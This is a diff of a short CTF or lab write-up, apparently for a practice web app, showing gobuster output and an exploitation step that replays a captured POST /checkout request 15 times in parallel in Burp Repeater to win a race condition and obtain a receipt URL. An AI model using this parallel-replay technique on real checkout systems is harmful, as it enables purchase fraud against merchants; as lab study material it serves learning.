@@ -36,14 +36,15 @@ Starting gobuster in directory enumeration mode
 Progress: 873100 / 873104 (100.00%)
 ======================================
 ```
-</code>
+
 
 **Exploiting**
 
 run in repeter in paralel run 15x 
 
 in Burpsuit
-POST /checkout HTTP/1.1
+
+```POST /checkout HTTP/1.1
 Host: 10.67.128.59
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
@@ -62,3 +63,5 @@ csrf_token=IjE3NGY2MjQ3N2QyZjc1ZTEyYzEyMWU4ZTJjNjk4NTk5Nzc3YmMyNzMi.aVN03A.fycCr
 
 end get this
 http://10.67.128.59/receipt/82739098304716027352341076?name=
+
+</code>
